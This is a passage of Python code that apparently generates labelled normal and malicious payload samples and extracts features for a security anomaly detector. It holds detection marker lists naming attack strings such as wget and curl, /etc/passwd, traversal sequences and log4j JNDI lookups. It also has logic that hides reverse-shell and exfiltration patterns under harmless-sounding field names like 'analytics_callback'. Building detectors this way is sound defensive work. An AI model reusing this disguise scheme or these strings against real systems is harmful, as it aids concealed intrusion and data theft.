                content_type=payload_type if payload_type != "command_injection" else "script",
                size=len(content),
                created_at=datetime.utcnow(),
                analyzed=True,
                anomaly_score=random.uniform(0.0, 0.3),
                is_anomalous=False,
                cluster_id=random.randint(0, 3)  # Expanded to 4 "normal" clusters
            )
            
            db.session.add(payload)
            db.session.flush()  # Get ID without committing
            
            payloads.append(payload)
        
        # Extract enhanced features
        features = extract_enhanced_features(content, payload_type, is_malicious=False)
        
        features_list.append(features)
        labels.append(0)  # 0 for normal
    
    # First, create at least one example of each vulnerability type
    logger.info(f"Generating samples for each vulnerability type")
    used_count = 0
    
    for vuln_type in vuln_types:
        # Choose a compatible payload type for this vulnerability
        if vuln_type == "xxe" or vuln_type == "xml_external_entity":
            payload_type = "xml"
        elif vuln_type == "sql_injection":
            payload_type = random.choice(["sql_injection", "json"])
        elif vuln_type == "xss":
            payload_type = random.choice(["xss", "json"])
        elif vuln_type == "insecure_deserialization" or vuln_type == "prototype_pollution" or vuln_type == "nosql_injection":
            payload_type = "json"
        else:
            payload_type = random.choice(list(PAYLOAD_TEMPLATES.keys()))
        
        content, vulnerability = generate_malicious_payload(payload_type)
        # Override the vulnerability name with the current type
        vulnerability["name"] = vuln_type.replace("_", " ").title()
        
        # Update vulnerability distribution counter
        vulnerability_distribution[vuln_type] += 1
        
        if save_to_db:
            # Create a payload entry with more informative naming
            payload = Payload(
                name=f"Vuln-{vuln_type}-{used_count:04d}",
                content=content,
                content_type=payload_type if payload_type != "command_injection" else "script",
                size=len(content),
                created_at=datetime.utcnow(),
                analyzed=True,
                anomaly_score=random.uniform(0.7, 1.0),
                is_anomalous=True,
                cluster_id=3 + (hash(vuln_type) % 5)  # Assign to clusters based on vulnerability type
            )
            
            db.session.add(payload)
            db.session.flush()  # Get ID without committing
            
            # Create vulnerability entry
            vuln = Vulnerability(
                name=vulnerability["name"],
                description=vulnerability["description"],
                severity=vulnerability["severity"],
                confidence=vulnerability["confidence"],
                payload_id=payload.id
            )
            
            db.session.add(vuln)
            
            payloads.append(payload)
        
        # Extract enhanced features
        features = extract_enhanced_features(content, payload_type, is_malicious=True, vuln_type=vuln_type)
        
        features_list.append(features)
        labels.append(1)  # 1 for anomalous
        
        used_count += 1
    
    # Generate remaining anomalous samples with random vulnerability types
    remaining_anomalous = anomalous_count - used_count
    logger.info(f"Generating {remaining_anomalous} additional anomalous samples")
    
    for i in range(remaining_anomalous):
        vuln_type = random.choice(vuln_types)
        
        # Choose appropriate payload type
        if vuln_type == "xxe":
            payload_type = "xml"
        elif vuln_type == "sql_injection":
            payload_type = random.choice(["sql_injection", "json"])
        elif vuln_type == "insecure_deserialization" or vuln_type == "prototype_pollution":
            payload_type = "json"
        else:
            payload_type = random.choice(list(PAYLOAD_TEMPLATES.keys()))
        
        content, vulnerability = generate_malicious_payload(payload_type)
        
        # Update vulnerability distribution counter
        vulnerability_distribution[vuln_type] += 1
        
        if save_to_db:
            # Create a payload entry
            payload = Payload(
                name=f"Vuln-{vuln_type}-extra-{i:04d}",
                content=content,
                content_type=payload_type if payload_type != "command_injection" else "script",
                size=len(content),
                created_at=datetime.utcnow(),
                analyzed=True,
                anomaly_score=random.uniform(0.7, 1.0),
                is_anomalous=True,
                cluster_id=3 + (hash(vuln_type) % 5)  # Distribute across clusters
            )
            
            db.session.add(payload)
            db.session.flush()  # Get ID without committing
            
            # Create vulnerability entry
            vuln = Vulnerability(
                name=vulnerability["name"],
                description=vulnerability["description"],
                severity=vulnerability["severity"],
                confidence=vulnerability["confidence"],
                payload_id=payload.id
            )
            
            db.session.add(vuln)
            
            payloads.append(payload)
        
        # Extract enhanced features
        features = extract_enhanced_features(content, payload_type, is_malicious=True, vuln_type=vuln_type)
        
        features_list.append(features)
        labels.append(1)  # 1 for anomalous
    
    if save_to_db:
        # Commit all changes
        try:
            db.session.commit()
            logger.info(f"Successfully saved {count} enhanced sample payloads to database")
        except Exception as e:
            db.session.rollback()
            logger.error(f"Error saving enhanced sample data to database: {str(e)}")
    
    return {
        "total_count": normal_count + used_count + remaining_anomalous,
        "normal_count": normal_count,
        "anomalous_count": used_count + remaining_anomalous,
        "vulnerability_distribution": vulnerability_distribution,
        "features": features_list,
        "labels": labels,
        "payloads": payloads if save_to_db else []
    }

def extract_enhanced_features(content, content_type, is_malicious=False, vuln_type=None):
    """
    Extract a more comprehensive set of features from payload content.
    
    Args:
        content (str): Payload content
        content_type (str): Type of payload content
        is_malicious (bool): Whether the content is known to be malicious
        vuln_type (str, optional): Type of vulnerability if known
        
    Returns:
        dict: Dictionary of extracted features
    """
    # Basic features common to all payloads
    features = {
        "length": len(content),
        "unique_chars": len(set(content)),
        "char_ratio": len(set(content)) / max(1, len(content)),
        "has_sql_keywords": any(kw in content.upper() for kw in ["SELECT", "INSERT", "UPDATE", "DELETE", "UNION", "JOIN", "WHERE"]),
        "has_script_tags": "<script>" in content.lower() or "</script>" in content.lower(),
        "has_suspicious_chars": any(c in content for c in "';|><&$()[]{}"),
        "entropy": calculate_entropy(content),
        "contains_url": any(url in content.lower() for url in ["http://", "https://", "ftp://", "file://"]),
        "contains_base64": "base64" in content.lower() or is_likely_base64(content),
        "contains_html": "<" in content and ">" in content,
        "contains_json": content.strip().startswith("{") and content.strip().endswith("}"),
        "contains_xml": "<?xml" in content.lower() or "</" in content,
        "contains_ip": contains_ip_address(content),
        "contains_email": "@" in content and "." in content,
        "contains_command_chars": any(cmd in content for cmd in [";", "|", "`", "$", "&&"]),
        "contains_eval": "eval(" in content.lower() or "exec(" in content.lower() or "system(" in content.lower(),
        "contains_js_events": any(evt in content.lower() for evt in ["onload", "onerror", "onmouseover", "onclick"]),
        "contains_doctype": "<!DOCTYPE" in content or "<!ENTITY" in content,
        "contains_sql_comments": "--" in content or "/*" in content,
        "special_char_ratio": sum(1 for c in content if not c.isalnum()) / max(1, len(content)),
        "numeric_char_ratio": sum(1 for c in content if c.isdigit()) / max(1, len(content)),
        "uppercase_ratio": sum(1 for c in content if c.isupper()) / max(1, len(content)),
        "max_line_length": max([len(line) for line in content.split("\n")], default=0),
        "avg_line_length": sum([len(line) for line in content.split("\n")]) / max(1, len(content.split("\n"))),
        "line_count": content.count("\n") + 1,
        "whitespace_ratio": sum(1 for c in content if c.isspace()) / max(1, len(content)),
    }
    
    # Content type specific features
    if content_type == "json" or features["contains_json"]:
        try:
            json_obj = json.loads(content)
            features.update({
                "json_depth": get_json_depth(json_obj),
                "json_breadth": get_json_breadth(json_obj),
                "json_size": get_json_size(json_obj),
                "json_key_count": len(extract_json_keys(json_obj)),
                "json_numeric_values": sum(1 for v in extract_json_values(json_obj) if isinstance(v, (int, float))),
                "json_string_values": sum(1 for v in extract_json_values(json_obj) if isinstance(v, str)),
                "json_bool_values": sum(1 for v in extract_json_values(json_obj) if isinstance(v, bool)),
                "json_null_values": sum(1 for v in extract_json_values(json_obj) if v is None),
                "json_array_values": sum(1 for v in extract_json_values(json_obj) if isinstance(v, list)),
                "json_object_values": sum(1 for v in extract_json_values(json_obj) if isinstance(v, dict)),
            })
        except (json.JSONDecodeError, TypeError):
            # If not valid JSON, set all JSON-specific features to 0
            features.update({
                "json_depth": 0,
                "json_breadth": 0,
                "json_size": 0,
                "json_key_count": 0,
                "json_numeric_values": 0,
                "json_string_values": 0,
                "json_bool_values": 0,
                "json_null_values": 0,
                "json_array_values": 0,
                "json_object_values": 0,
            })
    
    # Add vulnerability-specific markers if known
    if is_malicious and vuln_type:
        vuln_markers = {
            "sql_injection": ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "DROP", "--", "/*", "'", "%27"],
            "xss": ["<script>", "javascript:", "onload=", "onerror=", "eval(", "document.cookie", "alert("],
            "command_injection": [";", "|", "&", "$(", "`", "/bin/", "/etc/", "cat ", "wget ", "curl "],
            "xxe": ["<!DOCTYPE", "<!ENTITY", "SYSTEM", "file:///", "php://", "data://"],
            "path_traversal": ["../", "..\\", "%2e%2e", "....//", "/etc/passwd", "/proc/self/"],
            "server_side_template_injection": ["{{", "${", "<%=", "<#", "#{"],
            "insecure_deserialization": ["O:", "rO0", "__proto__", "constructor", "prototype"],
            "log4j": ["${jndi:", "${lower:", "${::-j"],
            "nosql_injection": ["$ne", "$gt", "$regex", "$where"],
            "prototype_pollution": ["__proto__", "constructor.prototype"],
            "file_upload": ["GIF89a", "<?php", "<%@"],
        }
        
        # Add marker counts for the specific vulnerability type
        if vuln_type in vuln_markers:
            for marker in vuln_markers[vuln_type]:
                feature_name = f"marker_{vuln_type}_{marker.replace(':', '_').replace('.', '_').replace('<', 'lt').replace('>', 'gt').replace('$', 'dollar').replace('%', 'percent').replace('/', 'slash')}"
                features[feature_name] = content.lower().count(marker.lower())
    
    return features

def is_likely_base64(s):
    """
    Check if a string is likely to be base64 encoded.
    
    Args:
        s (str): String to check
        
    Returns:
        bool: Whether the string is likely base64 encoded
    """
    # Must be at least 20 chars to meaningfully detect base64
    if len(s) < 20:
        return False
    
    # Base64 strings usually contain only alphanumeric chars plus '+', '/' and possibly '=' padding
    base64_chars = set(string.ascii_letters + string.digits + '+/=')
    # At least 90% of chars should be base64 chars for a likely match
    if sum(1 for c in s if c in base64_chars) / len(s) < 0.9:
        return False
    
    # Base64 encoding makes the output length a multiple of 4
    if len(s) % 4 != 0:
        return False
    
    # Likely a base64 string
    return True

def contains_ip_address(s):
    """
    Check if a string contains an IP address.
    
    Args:
        s (str): String to check
        
    Returns:
        bool: Whether the string contains an IP address
    """
    # Simple regex for IPv4 addresses
    ip_pattern = r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
    return bool(re.search(ip_pattern, s))

def generate_specialized_payload(vulnerability_type, payload_format="json"):
    """
    Generate a specialized payload with a specific vulnerability type.
    
    Args:
        vulnerability_type (str): Type of vulnerability to generate
        payload_format (str): Format of the payload (json, xml, etc.)
        
    Returns:
        tuple: (payload content, vulnerability details)
    """
    if vulnerability_type not in MALICIOUS_PATTERNS:
        raise ValueError(f"Unsupported vulnerability type: {vulnerability_type}")
    
    # Generate a normal payload first
    if payload_format in PAYLOAD_TEMPLATES:
        payload = generate_normal_payload(payload_format)
    else:
        # Default to JSON if format not supported
        payload = generate_normal_payload("json")
    
    # Choose a pattern to inject
    pattern = random.choice(MALICIOUS_PATTERNS[vulnerability_type])
    
    # Default vulnerability name (in case it's not set in the specific handlers)
    vulnerability_name = vulnerability_type.replace("_", " ").title()
    
    # Inject the vulnerability
    if vulnerability_type == "sql_injection":
        # For SQL injection, replace a value with the malicious pattern
        payload = re.sub(r"'[^']*'", f"'{pattern}'", payload, count=1)
        vulnerability_name = "SQL Injection"
    
    elif vulnerability_type == "xss":
        # For XSS, inject into a field value
        if payload_format == "json":
            # Inject into a JSON value
            payload = re.sub(r'"[^"]*"', f'"{pattern}"', payload, count=1)
        else:
            # Inject into text content
            payload = re.sub(r">([^<]*)<", f">{pattern}<", payload, count=1)
        vulnerability_name = "Cross-Site Scripting (XSS)"
    
    elif vulnerability_type == "command_injection":
        # Inject command
        if payload_format == "json":
            # Inject into a JSON value
            payload = re.sub(r'"[^"]*"', f'"{pattern}"', payload, count=1)
        else:
            # Inject into text content
            payload = re.sub(r">([^<]*)<", f">{pattern}<", payload, count=1)
        vulnerability_name = "Command Injection"
        
    elif vulnerability_type == "reverse_shell":
        # Inject reverse shell
        if payload_format == "json":
            # For JSON, add the reverse shell command as a new field or value
            if "}" in payload:
                payload = payload.replace("}", f', "execute_script": "{pattern}"}}')
            else:
                payload += f' {{ "execute_script": "{pattern}" }}'
        elif payload_format == "script":
            # For scripts, append the reverse shell at the end
            payload += f"\n\n# Execution block\n{pattern}"
        else:
            # For other formats, append as a comment or in appropriate format
            payload += f"\n\n<!-- Execute: {pattern} -->"
        vulnerability_name = "Reverse Shell"
    
    elif vulnerability_type == "device_foothold":
        # Inject device foothold payload
        if payload_format == "json":
            # For JSON, add the foothold command as a new field
            escaped_pattern = pattern.replace("\\", "\\\\").replace("\"", "\\\"")
            if "}" in payload:
                new_field = ', "maintenance_script": "' + escaped_pattern + '"}'
                payload = payload.replace("}", new_field)
            else:
                new_object = ' { "maintenance_script": "' + escaped_pattern + '" }'
                payload += new_object
        elif payload_format == "script":
            # For scripts, append the foothold commands
            payload += "\n\n# System Maintenance\n" + pattern
        else:
            # For other formats, try to add as appropriate
            escaped_html = pattern.replace('<', '&lt;').replace('>', '&gt;')
            payload += "\n\n<!-- System Maintenance: " + escaped_html + " -->"
        vulnerability_name = "Device Foothold"
    
    elif vulnerability_type == "data_exfiltration":
        # Inject data exfiltration payload
        if payload_format == "json":
            # For JSON, add the exfiltration command as a new field
            escaped_pattern = pattern.replace("\\", "\\\\").replace("\"", "\\\"")
            if "}" in payload:
                new_field = ', "analytics_callback": "' + escaped_pattern + '"}'
                payload = payload.replace("}", new_field)
            else:
                new_object = ' { "analytics_callback": "' + escaped_pattern + '" }'
                payload += new_object
        elif payload_format == "script":
            # For scripts, append the exfiltration commands
            payload += "\n\n# Analytics Module\n" + pattern
        else:
            # For other formats, try to add as appropriate
            escaped_html = pattern.replace('<', '&lt;').replace('>', '&gt;')
            payload += "\n\n<!-- Analytics Module: " + escaped_html + " -->"
        vulnerability_name = "Data Exfiltration"
    
    elif vulnerability_type == "xxe":
        # For XXE, replace XML declaration if XML format
        if payload_format == "xml" or payload.startswith("<?xml"):
            payload = pattern
        else:
            # For non-XML formats, try to inject into a value
            payload = re.sub(r'"[^"]*"', f'"{pattern}"', payload, count=1)
        vulnerability_name = "XML External Entity (XXE)"
    
    elif vulnerability_type == "path_traversal":
        # For path traversal, replace a path value
        if payload_format == "json":
            # Inject into a JSON value resembling a path
            payload = re.sub(r'"(/[^"]*)"', f'"{pattern}"', payload, count=1)
        else:
            # Inject into text content resembling a path
            payload = re.sub(r">(/[^<]*)<", f">{pattern}<", payload, count=1)
        vulnerability_name = "Path Traversal"
    
    # Create vulnerability details
    vulnerability = {
        "name": vulnerability_name,
        "description": f"Injected {vulnerability_type} vulnerability pattern: {pattern}",
        "severity": random.choice(["medium", "high", "critical"]),
        "confidence": round(random.uniform(0.7, 0.95), 2)
    }
    
    return payload, vulnerability
